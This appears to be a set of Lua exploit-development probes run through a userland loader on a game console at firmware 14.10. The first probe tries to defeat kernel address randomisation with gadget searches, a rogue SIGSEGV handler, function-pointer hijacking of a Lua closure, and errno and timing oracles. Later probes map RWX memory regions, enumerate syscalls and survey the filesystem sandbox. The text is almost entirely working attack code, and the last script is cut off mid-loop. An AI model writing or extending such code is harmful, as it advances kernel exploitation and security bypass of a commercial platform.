```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56k: KASLR brute-force via signal handler + errno oracle
--
-- Context: ALL memory scanning and timing KASLR paths are dead on 14.10.
-- SMAP blocks timing side-channel. No kernel pointers in any userland memory.
--
-- 13.60 data:
--   kernel_base observed: 0xffffffff8a9c0000 and 0xffffffff9e3f0000
--   sysent offset from TEXT: 0xE6E5C0
--   alignment: at least 0x10000 (64KB), both 16KB-page-aligned
--   KERNBASE: 0xffffffff80000000
--
-- Strategy:
--   [A] Setup + derive addresses
--   [B] Install SIGSEGV handler via sigaction(416) — test if we can recover from faults
--   [C] Errno oracle: mincore/msync/madvise with kernel VAs — check if errno differs
--       for mapped (present but supervisor) vs unmapped kernel pages
--   [D] sys 202 sysctl errno check with kernel VA as output buffer
--   [E] CClosure redirect to kernel VA — test if pcall or signal handler catches it
--   [F] Batch candidate test: if any oracle works, scan the KASLR range

print("=== PROBE 56k: KASLR BRUTE-FORCE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- Get eboot base for gadget search
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_text_lo = safe_rd(info_buf + 0x108) or 0
local eb_text_hi = safe_rd(info_buf + 0x10C) or 0
local eb_text_sz = safe_rd(info_buf + 0x110) or 0
print(string.format("  eboot text: 0x%X_%08X size=0x%X", eb_text_hi, eb_text_lo, eb_text_sz))

-- Get rawequal CClosure address for redirect
local re_str = tostring(rawequal)
local re_dec = re_str:match(": (%d+)")
local re_hex = re_str:match("(0x[0-9a-fA-F]+)")
local cclosure_addr = nil
if re_hex then
    cclosure_addr = uint64(re_hex)
    print("  rawequal CClosure: " .. re_hex)
elseif re_dec then
    cclosure_addr = uint64(re_dec)
    print("  rawequal CClosure: " .. re_dec)
end

-- clock_gettime for nanosecond timing
local sc_clock = make_syscall(232)
local ts = memory.alloc(16)
local function get_ns()
    safe_wq(ts, uint64(0))
    safe_wq(ts + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts)) end)
    local sec = safe_rd(ts) or 0
    local nsec = safe_rd(ts + 8) or 0
    return sec * 1000000000 + nsec
end

-- ============================================================
-- [B] Signal handler installation via sigaction(416)
-- FreeBSD sigaction: sys 416, args: (sig, act, oact)
-- struct sigaction { void(*handler)(int); int sa_flags; sigset_t sa_mask; }
-- SIGSEGV = 11, SA_SIGINFO = 0x40
-- ============================================================
print("")
print("[B] Signal handler test")

local sc_sigaction = make_syscall(416)

-- We need a handler address. Use a known safe function.
-- Find the xor eax,eax; ret gadget (C3) in eboot — this returns 0
-- It won't properly sigreturn, but let's see what happens
local gadget_addr = nil
if eb_text_sz > 0 then
    local search_start = uint64(string.format("0x%X%08X", eb_text_hi, eb_text_lo))
    -- Search for C3 (ret) preceded by 31 C0 (xor eax,eax) = 31 C0 C3
    for off = 0, math.min(eb_text_sz - 3, 0x100000), 1 do
        local a = search_start + off
        local b0 = safe_rd(a)
        if b0 then
            local byte0 = b0 % 256
            local byte1 = math.floor(b0 / 256) % 256
            local byte2 = math.floor(b0 / 65536) % 256
            if byte0 == 0x31 and byte1 == 0xC0 and byte2 == 0xC3 then
                gadget_addr = a
                print(string.format("  xor eax,eax;ret at eboot+0x%X", off))
                break
            end
        end
    end
    if not gadget_addr then
        -- Fallback: just find a ret (C3)
        for off = 0, math.min(eb_text_sz - 1, 0x10000), 1 do
            local a = search_start + off
            local b0 = safe_rd(a)
            if b0 and (b0 % 256) == 0xC3 then
                gadget_addr = a
                print(string.format("  ret gadget at eboot+0x%X", off))
                break
            end
        end
    end
end

-- Try installing SIGSEGV handler
-- sigaction struct layout on FreeBSD amd64:
-- +0x00: sa_handler (8 bytes)
-- +0x08: sa_flags (4 bytes)
-- +0x10: sa_mask (16 bytes - sigset_t)
-- Total: ~0x20 bytes
local sa_buf = memory.alloc(0x40)
local sa_old = memory.alloc(0x40)
for i = 0, 15 do safe_wd(sa_buf + i*4, 0) end
for i = 0, 15 do safe_wd(sa_old + i*4, 0) end

local sa_installed = false
if gadget_addr then
    -- Set handler to our gadget
    safe_wq(sa_buf, gadget_addr)
    -- SA_SIGINFO = 0x40, SA_RESTART = 0x2
    safe_wd(sa_buf + 8, 0x42)
    -- Empty signal mask
    safe_wq(sa_buf + 0x10, uint64(0))
    safe_wq(sa_buf + 0x18, uint64(0))

    local sa_ok, sa_ret = pcall(function()
        return sc_sigaction(uint64(11), uint64(sa_buf), uint64(sa_old))
    end)
    local sa_rv = sa_ok and to_num(sa_ret) or -999
    print("  sigaction(SIGSEGV) ret=" .. sa_rv)

    if sa_rv == 0 then
        sa_installed = true
        -- Read old handler
        local old_handler = safe_rq(sa_old)
        print("  old handler: " .. hexval(old_handler))
    end
else
    print("  no gadget found, skipping sigaction")
end

-- ============================================================
-- [C] Errno oracle: mincore/msync/madvise on kernel VAs
-- Test if errno differs between mapped-supervisor and unmapped kernel pages
-- ============================================================
print("")
print("[C] Errno oracle test")

local sc_mincore = make_syscall(78)
local sc_msync = make_syscall(227)
local sc_madvise = make_syscall(75)
local vec_buf = memory.alloc(64)

-- Helper to get errno via __error()
-- Actually we can't easily get errno from Lua. Use return value patterns.
-- FreeBSD syscalls return -1 on error; the actual errno is in a thread-local.
-- Our pcall wrapper can distinguish: ret=-1 vs pcall-fail vs ret=0

local function test_oracle(name, addr_hi, addr_lo)
    local addr_str = string.format("0x%08X%08X", addr_hi, addr_lo)
    local addr = uint64(addr_str)

    -- mincore(addr, 0x4000, vec)
    safe_wd(vec_buf, 0xFF)
    local mc_ok, mc_ret = pcall(function()
        return sc_mincore(uint64(addr_str), uint64(0x4000), uint64(vec_buf))
    end)
    local mc_rv = mc_ok and to_num(mc_ret) or -999
    local mc_vec = safe_rd(vec_buf) or 0xFF

    -- msync(addr, 0x4000, MS_ASYNC=1)
    local ms_ok, ms_ret = pcall(function()
        return sc_msync(uint64(addr_str), uint64(0x4000), uint64(1))
    end)
    local ms_rv = ms_ok and to_num(ms_ret) or -999

    -- madvise(addr, 0x4000, MADV_WILLNEED=3)
    local ma_ok, ma_ret = pcall(function()
        return sc_madvise(uint64(addr_str), uint64(0x4000), uint64(3))
    end)
    local ma_rv = ma_ok and to_num(ma_ret) or -999

    return mc_rv, mc_vec, ms_rv, ma_rv
end

-- Test reference points first
print("  Reference: userland valid address")
local ref_heap = memory.alloc(0x4000)
do
    local rh_h, rh_l = get_hi_lo(ref_heap)
    if rh_h == 0 then rh_h = 0; rh_l = to_num(ref_heap) end
    local mc, mcv, ms, ma = test_oracle("heap", rh_h, rh_l)
    print(string.format("    mincore=%d vec=0x%X msync=%d madvise=%d", mc, mcv, ms, ma))
end

print("  Reference: unmapped userland")
do
    local mc, mcv, ms, ma = test_oracle("unmap", 0x00007FFF, 0xDEAD0000)
    print(string.format("    mincore=%d vec=0x%X msync=%d madvise=%d", mc, mcv, ms, ma))
end

-- Now test kernel VAs — these are the candidates from 13.60 observed bases
-- On 14.10, the kernel base is somewhere in the KASLR range
-- KERNBASE = 0xFFFFFFFF80000000
local kva_tests = {
    {name="KERNBASE",           hi=0xFFFFFFFF, lo=0x80000000},
    {name="13.60 base1",        hi=0xFFFFFFFF, lo=0x8A9C0000},
    {name="13.60 base1+sysent", hi=0xFFFFFFFF, lo=0x8A9C0000 + 0xE6E5C0},
    {name="13.60 base2",        hi=0xFFFFFFFF, lo=0x9E3F0000},
    {name="unmapped kernel hi", hi=0xFFFFFFFF, lo=0xF0000000},
    {name="FFFFFFFF_FFFFFFFF",  hi=0xFFFFFFFF, lo=0xFFFFFFFF},
    {name="low kernel",         hi=0xFFFF8000, lo=0x00000000},
    {name="mid kernel",         hi=0xFFFF8000, lo=0x40000000},
}

print("  Kernel VA oracle tests:")
local results = {}
for _, t in ipairs(kva_tests) do
    local mc, mcv, ms, ma = test_oracle(t.name, t.hi, t.lo)
    print(string.format("    %s: mc=%d vec=0x%X ms=%d ma=%d",
        t.name, mc, mcv, ms, ma))
    results[t.name] = {mc=mc, ms=ms, ma=ma}
end

-- Check if ANY result differs from the "unmapped kernel hi" baseline
local baseline = results["unmapped kernel hi"]
local oracle_found = false
if baseline then
    for _, t in ipairs(kva_tests) do
        local r = results[t.name]
        if r and (r.mc ~= baseline.mc or r.ms ~= baseline.ms or r.ma ~= baseline.ma) then
            if t.name ~= "unmapped kernel hi" then
                print("  ** ORACLE HIT: " .. t.name .. " differs from unmapped baseline! **")
                oracle_found = true
            end
        end
    end
end
if not oracle_found then
    print("  No errno differentiation found (all kernel VAs return same)")
end

-- ============================================================
-- [D] sys 202 sysctl with kernel VA as output buffer
-- If copyin/copyout returns different errno for valid-supervisor vs unmapped...
-- ============================================================
print("")
print("[D] Sysctl buffer oracle")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(16)
local oldlenp = memory.alloc(8)

-- kern.version = MIB {1, 4}
safe_wd(mib, 1)
safe_wd(mib + 4, 4)

-- Test with valid userland buffer (reference)
local outbuf = memory.alloc(0x400)
safe_wd(oldlenp, 0x400)
local sv_ok, sv_ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
end)
print("  kern.version to heap: ret=" .. (sv_ok and to_num(sv_ret) or -999))

-- Test with kernel VA as output buffer
local kva_buf_tests = {
    {name="KERNBASE",    addr="0xFFFFFFFF80000000"},
    {name="13.60 base1", addr="0xFFFFFFFF8A9C0000"},
    {name="unmapped hi", addr="0xFFFFFFFFF0000000"},
    {name="NULL",        addr="0x0000000000000000"},
}

for _, t in ipairs(kva_buf_tests) do
    safe_wd(oldlenp, 0x400)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(2), uint64(t.addr), uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kern.version to %s: ret=%d", t.name, rv))
end

-- ============================================================
-- [E] CClosure redirect to kernel VA — does pcall catch the fault?
-- WARNING: this WILL crash if signal handler doesn't recover
-- Only test if signal handler was installed
-- ============================================================
print("")
print("[E] CClosure redirect fault test")

if sa_installed and cclosure_addr then
    -- Save original +0x20
    local orig_fn = safe_rq(cclosure_addr + 0x20)
    print("  rawequal +0x20 original: " .. hexval(orig_fn))

    -- Test 1: redirect to a known-safe userland address (gadget) to confirm redirect works
    if gadget_addr then
        safe_wq(cclosure_addr + 0x20, gadget_addr)
        local test_ok, test_ret = pcall(function() return rawequal(1, 2) end)
        -- Restore immediately
        safe_wq(cclosure_addr + 0x20, orig_fn)
        print("  redirect to gadget: pcall_ok=" .. tostring(test_ok) .. " ret=" .. tostring(test_ret))
    end

    -- Test 2: redirect to UNMAPPED kernel VA (should fault)
    print("  Testing redirect to unmapped kernel VA...")
    print("  (if no output after this, process crashed)")
    safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
    local fault_ok, fault_ret = pcall(function() return rawequal(1, 2) end)
    -- Restore
    safe_wq(cclosure_addr + 0x20, orig_fn)
    print("  redirect to unmapped kernel: pcall_ok=" .. tostring(fault_ok) ..
          " ret=" .. tostring(fault_ret))

    -- If we survived, test with 13.60 kernel base
    print("  Testing redirect to 13.60 base1 kernel VA...")
    print("  (if no output after this, process crashed)")
    safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFF8A9C0000"))
    local kb_ok, kb_ret = pcall(function() return rawequal(1, 2) end)
    safe_wq(cclosure_addr + 0x20, orig_fn)
    print("  redirect to kernel base1: pcall_ok=" .. tostring(kb_ok) ..
          " ret=" .. tostring(kb_ret))

    -- If we STILL survived, the signal handler works as a fault recovery!
    -- Now test: does behavior differ for mapped vs unmapped kernel pages?
    if fault_ok ~= nil then
        print("")
        print("  ** SIGNAL RECOVERY WORKS — testing oracle **")

        -- Time the fault for mapped vs unmapped
        local SAMPLES = 20
        local unmapped_times = {}
        local mapped_times = {}

        -- Unmapped VA: 0xFFFFFFFFF0000000
        for i = 1, SAMPLES do
            local ta = get_ns()
            safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cclosure_addr + 0x20, orig_fn)
            local tb = get_ns()
            unmapped_times[i] = tb - ta
        end

        -- 13.60 base1 VA: 0xFFFFFFFF8A9C0000 (might be mapped on 14.10 if same base)
        for i = 1, SAMPLES do
            local ta = get_ns()
            safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFF8A9C0000"))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cclosure_addr + 0x20, orig_fn)
            local tb = get_ns()
            mapped_times[i] = tb - ta
        end

        local sum_u, sum_m = 0, 0
        for i = 1, SAMPLES do
            sum_u = sum_u + unmapped_times[i]
            sum_m = sum_m + mapped_times[i]
        end
        print(string.format("  unmapped avg=%d ns, mapped avg=%d ns",
            sum_u / SAMPLES, sum_m / SAMPLES))
        print(string.format("  unmapped samples: %d,%d,%d,%d,%d",
            unmapped_times[1], unmapped_times[2], unmapped_times[3],
            unmapped_times[4], unmapped_times[5]))
        print(string.format("  mapped samples: %d,%d,%d,%d,%d",
            mapped_times[1], mapped_times[2], mapped_times[3],
            mapped_times[4], mapped_times[5]))

        local diff = math.abs(sum_m / SAMPLES - sum_u / SAMPLES)
        local noise = math.abs(unmapped_times[1] - unmapped_times[2])
        if diff > noise * 3 then
            print("  ** TIMING ORACLE VIABLE — mapped/unmapped timing differs! **")
        else
            print("  timing difference within noise")
        end
    end
else
    if not sa_installed then
        print("  signal handler not installed, skipping redirect tests")
    end
    if not cclosure_addr then
        print("  CClosure addr not found, skipping redirect tests")
    end
end

-- ============================================================
-- [F] Batch KASLR scan (if oracle found)
-- 13.60 data: bases at offset 0x0A9C0000 and 0x1E3F0000 from KERNBASE
-- Try scanning with 0x200000 (2MB) steps from KERNBASE to KERNBASE+1GB
-- ============================================================
print("")
print("[F] KASLR batch scan")

-- Even without a proven oracle, dump the errno/return patterns for
-- a range of candidates so we can look for anomalies offline
local KERNBASE_HI = 0xFFFFFFFF
local KERNBASE_LO = 0x80000000
local STEP = 0x200000  -- 2MB steps
local MAX_SCAN = 0x40000000  -- 1GB range = 512 candidates

print(string.format("  range: 0x%08X_%08X to 0x%08X_%08X step=0x%X",
    KERNBASE_HI, KERNBASE_LO,
    KERNBASE_HI, KERNBASE_LO + MAX_SCAN,
    STEP))
print("  candidates: " .. (MAX_SCAN / STEP))

-- Quick scan: mincore + msync for each candidate
local anomalies = {}
for off = 0, MAX_SCAN - STEP, STEP do
    local cand_lo = KERNBASE_LO + off
    local cand_hi = KERNBASE_HI
    -- Handle overflow
    if cand_lo >= 0x100000000 then
        cand_lo = cand_lo - 0x100000000
        -- Still in high canonical space, this wraps but kernel VA space is flat
    end

    local addr_str = string.format("0x%08X%08X", cand_hi, cand_lo)
    local addr = uint64(addr_str)

    -- mincore
    safe_wd(vec_buf, 0xFF)
    local mc_ok, mc_ret = pcall(function()
        return sc_mincore(addr, uint64(0x4000), uint64(vec_buf))
    end)
    local mc_rv = mc_ok and to_num(mc_ret) or -999
    local mc_vec = safe_rd(vec_buf) or 0xFF

    -- msync
    local ms_ok, ms_ret = pcall(function()
        return sc_msync(addr, uint64(0x4000), uint64(1))
    end)
    local ms_rv = ms_ok and to_num(ms_ret) or -999

    -- Check for anomaly (different from standard -1/-999 pattern)
    if mc_rv ~= -1 or ms_rv ~= -1 or mc_vec ~= 0xFF then
        local idx = #anomalies + 1
        anomalies[idx] = string.format("0x%08X_%08X mc=%d vec=0x%X ms=%d",
            cand_hi, cand_lo, mc_rv, mc_vec, ms_rv)
        if idx <= 20 then
            print("  ANOMALY: " .. anomalies[idx])
        end
    end
end

print(string.format("  scan complete. anomalies: %d / %d", #anomalies, MAX_SCAN / STEP))

if #anomalies == 0 then
    print("  no errno anomalies found in 2MB scan")
    print("  trying 64KB step on smaller range (KERNBASE to +256MB)...")

    -- Finer scan on a subset
    local FINE_MAX = 0x10000000  -- 256MB
    local FINE_STEP = 0x10000    -- 64KB
    local fine_anomalies = 0

    for off = 0, FINE_MAX - FINE_STEP, FINE_STEP do
        local cand_lo = KERNBASE_LO + off
        local addr_str = string.format("0x%08X%08X", KERNBASE_HI, cand_lo)

        safe_wd(vec_buf, 0xFF)
        local mc_ok, mc_ret = pcall(function()
            return sc_mincore(uint64(addr_str), uint64(0x4000), uint64(vec_buf))
        end)
        local mc_rv = mc_ok and to_num(mc_ret) or -999
        local mc_vec = safe_rd(vec_buf) or 0xFF

        if mc_rv ~= -1 or mc_vec ~= 0xFF then
            fine_anomalies = fine_anomalies + 1
            if fine_anomalies <= 10 then
                print(string.format("    ANOMALY at 0x%08X_%08X mc=%d vec=0x%X",
                    KERNBASE_HI, cand_lo, mc_rv, mc_vec))
            end
        end
    end
    print(string.format("  fine scan: %d anomalies / %d candidates",
        fine_anomalies, FINE_MAX / FINE_STEP))
end

collectgarbage("restart")

print("")
print("=== PROBE 56k COMPLETE ===")
```

```lua
-- 14.10 Recon Probe 01: Identity & Environment
-- Baseline info: firmware, PID, module bases, available globals
-- Run this FIRST to confirm the loader is working on 14.10

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: IDENTITY ===")
log("timestamp: " .. os.date("%Y-%m-%d %H:%M:%S"))

-- Platform & firmware
log("")
log("--- platform ---")
log("PLATFORM: " .. tostring(PLATFORM))
log("FW_VERSION: " .. tostring(FW_VERSION))

-- PID
local pid = syscall.getpid():tonumber()
log("PID: " .. pid)

syscall.resolve({ getppid = 39, getuid = 24, geteuid = 25, getgid = 47, getegid = 43 })
log("PPID: " .. syscall.getppid():tonumber())
log("UID: " .. syscall.getuid():tonumber())
log("EUID: " .. syscall.geteuid():tonumber())
log("GID: " .. syscall.getgid():tonumber())
log("EGID: " .. syscall.getegid():tonumber())

-- Module bases
log("")
log("--- module bases ---")
if eboot_base then log("eboot_base: " .. hex(eboot_base)) end
if libc_base then log("libc_base: " .. hex(libc_base)) end
if libkernel_base then log("libkernel_base: " .. hex(libkernel_base)) end

-- Enumerate all globals the loader provides
log("")
log("--- loader globals ---")
local globals = {}
for k, v in pairs(_G) do
    globals[#globals+1] = k .. " = " .. type(v)
end
table.sort(globals)
for _, g in ipairs(globals) do log("  " .. g) end

-- Check what's in syscall table
log("")
log("--- registered syscalls ---")
local sc = {}
for k, v in pairs(syscall) do
    sc[#sc+1] = k
end
table.sort(sc)
for _, s in ipairs(sc) do log("  " .. s) end

-- Check kernel module availability
log("")
log("--- kernel r/w status ---")
if type(kernel) == "table" then
    log("kernel table exists")
    if kernel.read_dword then
        log("  kernel.read_dword: available")
    else
        log("  kernel.read_dword: NOT available")
    end
    if kernel.addr then
        log("  kernel.addr entries:")
        for k, v in pairs(kernel.addr) do
            log("    " .. tostring(k) .. " = " .. tostring(v))
        end
    else
        log("  kernel.addr: NOT set (no kernel exploit ran)")
    end
else
    log("kernel table: NOT available (userland only)")
end

-- Check memory API
log("")
log("--- memory API ---")
if type(memory) == "table" then
    local mem_funcs = {}
    for k, v in pairs(memory) do
        mem_funcs[#mem_funcs+1] = k .. " = " .. type(v)
    end
    table.sort(mem_funcs)
    for _, f in ipairs(mem_funcs) do log("  " .. f) end
else
    log("memory table: NOT available")
end

-- PAGE_SIZE
log("")
log("PAGE_SIZE: " .. tostring(PAGE_SIZE))

log("")
log("=== IDENTITY PROBE DONE ===")
return table.concat(out, "\n")
```

```lua
    if ok3 then

        log("  kqueuex: fd=" .. fd)
        if fd >= 0 then syscall.close(fd) end
    else
        log("  kqueuex: " .. tostring(kqx):sub(1,30))
    end
end

-- kldnext is safe (returns first kld id)
if syscall.sc_kldnext then
    local ok3, r = pcall(function() return syscall.sc_kldnext(0) end)
    log("  kldnext(0): " .. (ok3 and tostring(r:tonumber()) or tostring(r):sub(1,30)))
end

log("")
log("=== SYSCALL SWEEP DONE ===")
return table.concat(out, "\n")
```

```lua
log("=== 14.10 RECON: VMMAP LAYOUT ===")
log("fw: " .. tostring(FW_VERSION))

local pid = syscall.getpid():tonumber()
log("pid: " .. pid)

-- Use sysctlbyname if available, otherwise use sysctl with MIB
local mib = memory.alloc(16)
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 32) -- KERN_PROC_VMMAP
memory.write_dword(mib + 12, pid)

local oldlenp = memory.alloc(8)
memory.write_dword(oldlenp, 0)
memory.write_dword(oldlenp + 4, 0)

syscall.resolve({ sc_sysctl = 202 })
local ret = syscall.sc_sysctl(mib, 4, 0, oldlenp, 0, 0)
local sz = memory.read_dword(oldlenp):tonumber()
log("vmmap size: " .. sz)

if sz == 0 then
    log("sysctl returned size 0 — may be blocked on 14.10")
    log("trying alternative: /proc/self/map")

    local f = io.open("/proc/" .. pid .. "/map", "r")
    if f then
        log("--- /proc/pid/map ---")
        for line in f:lines() do log(line) end
        f:close()
    else
        log("/proc/pid/map: not accessible")
    end

    log("=== VMMAP PROBE DONE (limited) ===")
    return table.concat(out, "\n")
end

if sz > 512000 then
    log("unexpectedly large, capping at 512K")
    sz = 512000
end

local data = memory.alloc(sz)
memory.write_dword(oldlenp, sz)
memory.write_dword(oldlenp + 4, 0)
syscall.sc_sysctl(mib, 4, data, oldlenp, 0, 0)
local actual = memory.read_dword(oldlenp):tonumber()
log("actual: " .. actual .. " bytes")

local type_names = {
    [0]="NONE", [1]="DEFAULT", [2]="VNODE", [3]="SWAP",
    [4]="DEVICE", [5]="PHYS", [6]="DEAD", [7]="SG",
    [8]="MGTDEVICE", [9]="GUARD",
}

local prot_str = function(p)
    local s = ""
    s = s .. (p % 2 >= 1 and "r" or "-")
    s = s .. (math.floor(p/2) % 2 >= 1 and "w" or "-")
    s = s .. (math.floor(p/4) % 2 >= 1 and "x" or "-")
    return s
end

log("")
log("--- memory regions ---")
log(string.format("%-36s %-4s %8s %s", "range", "prot", "size", "type"))

local offset = 0
local count = 0
local rwx_regions = {}
local exec_regions = {}
local rw_anon = {}

while offset < actual do
    local entry_sz = memory.read_dword(data + offset):tonumber()
    if entry_sz == 0 or entry_sz > 4096 then break end

    local kve_type = memory.read_dword(data + offset + 4):tonumber()
    local start_lo = memory.read_dword(data + offset + 8):tonumber()
    local start_hi = memory.read_dword(data + offset + 12):tonumber()
    local end_lo = memory.read_dword(data + offset + 16):tonumber()
    local end_hi = memory.read_dword(data + offset + 20):tonumber()
    local prot = memory.read_dword(data + offset + 56):tonumber()

    local size_bytes = (end_hi * 0x100000000 + end_lo) - (start_hi * 0x100000000 + start_lo)
    local size_kb = math.floor(size_bytes / 1024)
    local tname = type_names[kve_type] or tostring(kve_type)
    local ps = prot_str(prot)

    log(string.format("  %08x%08x-%08x%08x %s %6dK %s",
        start_hi, start_lo, end_hi, end_lo, ps, size_kb, tname))

    if prot >= 7 then
        rwx_regions[#rwx_regions+1] = string.format("%08x%08x %dK", start_hi, start_lo, size_kb)
    end
    if math.floor(prot/4) % 2 >= 1 then
        exec_regions[#exec_regions+1] = string.format("%08x%08x %dK %s", start_hi, start_lo, size_kb, tname)
    end
    if prot == 3 and kve_type == 1 then
        rw_anon[#rw_anon+1] = string.format("%08x%08x %dK", start_hi, start_lo, size_kb)
    end

    offset = offset + entry_sz
    count = count + 1
end

log("")
log("total VMAs: " .. count)

log("")
log("--- executable regions (code) ---")
for _, r in ipairs(exec_regions) do log("  " .. r) end

if #rwx_regions > 0 then
    log("")
    log("--- RWX REGIONS (potential targets!) ---")
    for _, r in ipairs(rwx_regions) do log("  " .. r) end
else
    log("")
    log("no RWX regions (W^X enforced)")
end

log("")
log("--- large rw anonymous (heap/stack candidates) ---")
for _, r in ipairs(rw_anon) do log("  " .. r) end

log("")
log("=== VMMAP PROBE DONE ===")
return table.concat(out, "\n")
```

```lua
log("")

local function try_sysctl(name, mib_vals, mib_len)
    local mib = memory.alloc(mib_len * 4)
    for i, v in ipairs(mib_vals) do
        memory.write_dword(mib + (i-1)*4, v)
    end
    local oldlenp = memory.alloc(8)
    memory.write_qword(oldlenp, 0)

    pcall(function() syscall.sc_sysctl(mib, mib_len, 0, oldlenp, 0, 0) end)
    local sz = memory.read_dword(oldlenp):tonumber()
    if sz > 0 and sz < 4096 then

        memory.write_qword(oldlenp, sz)
        pcall(function() syscall.sc_sysctl(mib, mib_len, buf, oldlenp, 0, 0) end)
        local chars = {}
        for i = 0, math.min(sz-1, 255) do
            local b = memory.read_byte(buf + i):tonumber()
            if b == 0 then break end
            chars[#chars+1] = string.char(b)
        end
        log("  " .. name .. " = " .. table.concat(chars))
    else
        log("  " .. name .. ": size=" .. sz)
    end
end
```

## probes/phase1_identity_layout/05_file_recon.lua

```lua
-- 14.10 Recon Probe 05: Filesystem & Module Recon
-- Uses syscall.resolve() properly

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: FILE RECON ===")
log("fw: " .. tostring(FW_VERSION))

syscall.resolve({
    sc_open = 5, sc_close = 6, sc_read = 3,
    sc_getdents = 272, sc_fstat = 189,
})

local function list_dir(path)
    local entries = {}
    local ok, err = pcall(function()
        local fd = syscall.sc_open(path, 0x00020000):tonumber()
        if fd < 0 then
            fd = syscall.sc_open(path, 0):tonumber()
        end
        if fd < 0 then return end

        local buf = memory.alloc(4096)
        while true do
            local n = syscall.sc_getdents(fd, buf, 4096):tonumber()
            if n <= 0 then break end

            local pos = 0
            while pos < n do
                local reclen = memory.read_word(buf + pos + 4):tonumber()
                if reclen == 0 then break end
                local d_type = memory.read_byte(buf + pos + 6):tonumber()

                local name_chars = {}
                for i = 0, math.min(reclen - 9, 255) do
                    local b = memory.read_byte(buf + pos + 8 + i):tonumber()
                    if b == 0 then break end
                    name_chars[#name_chars+1] = string.char(b)
                end
                local name = table.concat(name_chars)

                local type_str = "?"
                if d_type == 4 then type_str = "dir"
                elseif d_type == 8 then type_str = "file"
                elseif d_type == 10 then type_str = "link"
                elseif d_type == 2 then type_str = "chr"
                elseif d_type == 6 then type_str = "blk"
                end

                entries[#entries+1] = { name=name, dtype=type_str }
                pos = pos + reclen
            end
        end

        syscall.sc_close(fd)
    end)

    return entries, ok, err
end

local function read_file_head(path, max_bytes)
    max_bytes = max_bytes or 256
    local ok, result = pcall(function()
        local fd = syscall.sc_open(path, 0):tonumber()
        if fd < 0 then return nil end
        local buf = memory.alloc(max_bytes + 1)
        local n = syscall.sc_read(fd, buf, max_bytes):tonumber()
        syscall.sc_close(fd)
        if n <= 0 then return nil end
        local chars = {}
        for i = 0, n-1 do
            local b = memory.read_byte(buf + i):tonumber()
            if b == 0 then break end
            if b >= 32 and b < 127 then
                chars[#chars+1] = string.char(b)
            else
                chars[#chars+1] = "."
            end
        end
        return table.concat(chars)
    end)
    return ok and result or nil
end

local dirs_to_scan = {
    "/", "/dev", "/system", "/system/common",
    "/system/common/lib", "/system/priv/lib",
    "/system/sys", "/system/vsh",
    "/savedata0",
    "/app0", "/app0/sce_module",
    "/data",
    "/mnt", "/mnt/usb0", "/mnt/usb1",
    "/mnt/sandbox",
    "/proc",
    "/system_ex", "/system_ex/app",
}

for _, dir in ipairs(dirs_to_scan) do
    local entries, ok, err = list_dir(dir)
    if #entries > 0 then
        log("")
        log("--- " .. dir .. " (" .. #entries .. " entries) ---")
        for _, e in ipairs(entries) do
            log("  [" .. e.dtype .. "] " .. e.name)
        end
    else
        log("")
        log("--- " .. dir .. ": " .. (ok and "empty/inaccessible" or tostring(err):sub(1,40)))
    end
end

log("")
log("--- version files ---")

local version_files = {
    "/system/common/lib/build_tag.txt",
    "/system/common/lib/version.txt",
    "/system/build_tag",
    "/system/version",
    "/system/sys/version",
    "/savedata0/version.txt",
}

for _, path in ipairs(version_files) do
    local content = read_file_head(path, 512)
    if content then
        log("  " .. path .. ": " .. content)
    end
end

log("")
log("--- loaded modules ---")
local mod_entries = list_dir("/app0/sce_module")
if #mod_entries > 0 then
    for _, e in ipairs(mod_entries) do
        if e.name:find("%.prx$") or e.name:find("%.sprx$") then
            log("  " .. e.name)
        end
    end
end

local sys_mod_entries = list_dir("/system/common/lib")
if #sys_mod_entries > 0 then
    log("")
    log("--- /system/common/lib ---")
    local count = 0
    for _, e in ipairs(sys_mod_entries) do
        if e.name:find("%.prx$") or e.name:find("%.sprx$") then
            log("  " .. e.name)
            count = count + 1
            if count > 50 then
                log("  ... (truncated, " .. #sys_mod_entries .. " total)")
                break
            end
        end
    end
end

log("")
log("--- sandbox check ---")
local sandbox_tests = {
    "/", "/..",
    "/system/vsh/app/NPXS20001",
    "/user/home",
    "/mnt/sandbox/pfsmnt",
}
for _, path in ipairs(sandbox_tests) do
    local entries = list_dir(path)
